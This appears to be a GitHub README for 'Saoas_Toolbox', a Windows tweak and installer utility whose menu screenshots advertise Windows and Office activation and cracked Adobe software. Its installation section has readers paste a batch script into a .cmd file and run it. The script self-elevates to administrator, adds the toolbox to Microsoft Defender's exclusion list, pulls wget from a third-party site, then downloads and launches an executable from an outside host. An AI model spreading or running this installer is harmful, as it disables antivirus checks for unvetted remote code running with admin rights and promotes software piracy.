# Saoas_Toolbox
 - **Installation:**
   - Copy the following Code into an Text Document and save as .cmd File, then start the file.
```
@echo off
<!-- : --- Self-elevating.bat ---------------------------------------
whoami /groups | find "S-1-16-12288" > nul && goto :ELEVATED
echo Requesting administrative privileges...
set "ELEVATE_CMDLINE=cd /d "%cd%" & call "%~f0" %*"
cscript //nologo "%~f0?.wsf" //job:Elevate & exit /b

-->
<job id="Elevate"><script language="VBScript">
  Set objShell = CreateObject("Shell.Application")
  Set objWshShell = WScript.CreateObject("WScript.Shell")
  Set objWshProcessEnv = objWshShell.Environment("PROCESS")
  strCommandLine = Trim(objWshProcessEnv("ELEVATE_CMDLINE"))
  objShell.ShellExecute "cmd", "/c " & strCommandLine, "", "runas"
</script></job>
:ELEVATED -----------------------------------------------------------

powershell -Command Add-MpPreference -ExclusionProcess "Saoas_Toolbox.exe" -Force
cd /d "%USERPROFILE%/Desktop/"
powershell Invoke-WebRequest -Uri "https://eternallybored.org/misc/wget/1.21.4/64/wget.exe" -OutFile "wget.exe" 
wget -q --show-progress --user-agent="chrome" --no-hsts "https://links.saoas.tv/Toolbox/Saoas_Toolbox.exe" -O Saoas_Toolbox.exe
del /f wget.exe 
Saoas_Toolbox.exe
```

#####


![ToolboxMainMenu](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/063e3cdc-a9ca-4b37-93c1-d436a569cb57)


![ToolsMenu](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/f351e669-c48f-4224-b1a1-2c826645ad3f)


![Runtimes_FrameworksMenu](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/28d361bd-2420-4661-80c3-e8e94a5a0438)


![ProgramsMenu1](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/a2d4d6e6-03e1-44d5-b717-e092a3152945)


![ProgramsMenu2](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/995cbcfe-d152-4d42-b158-7bfed4150095)


![InternetBrowsersMenu](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/ec13db58-b254-4d53-9ab6-5b2c31048777)


![WindowsTweaksMainMenu](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/99e3525d-38e5-4674-8cf3-d2552a68e37e)


![ContextTweaksMenu1](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/cce4654a-967d-406c-a444-c2e25f5bfe4a)


![ContextTweaksMenu2](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/76422e36-a392-4246-b3d8-684f4006bfb8)


![ContextTweaksMenu3](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/b417c8dd-ec0f-4427-81d7-ad9c26f09a5a)


![ContextTweaksMenu4](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/a9ea7e0a-6514-4bcb-9665-b088dd681295)


![WindowsTweaksMenu1](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/ffc6e5fb-4794-41db-bb40-4ad7eda760b3)


![WindowsTweaksMenu2](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/c5a85d19-324a-4d0e-bff7-cfada0172bcc)


![WindowsTweaksMenu3](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/f872ac75-d9e9-4702-9ecc-b08a3cdcbdfe)


![WindowsActivationInstallMenu](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/5b5647c4-5797-4550-a25f-3ad12254905f)


![OfficeInstallActivationMenu](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/cac03ff8-bc9a-48e6-b203-9183b4557f45)


![CrackedFilesMainMenu](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/19abb8ff-92e0-4e2f-99b2-38b15481a40c)


![CrackedAdobeMenu1](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/08a209a9-c3c1-47bb-8ada-c273ffd1cae8)


![CrackedAdobeMenu2](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/f15d8d15-194b-40dc-b60a-b5c5db1df700)


![MicrosoftVisualStudioMainMenu](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/620e7388-5b99-434f-b1ff-7a194be1e04f)


![MicrosoftVisualStudio2022Menu](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/b56daa2a-87d2-4f37-9f81-303124e92de8)


![PacketManagersMenu](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/56074cfa-f3ac-4bc6-8f87-0612b0c8a2d0)
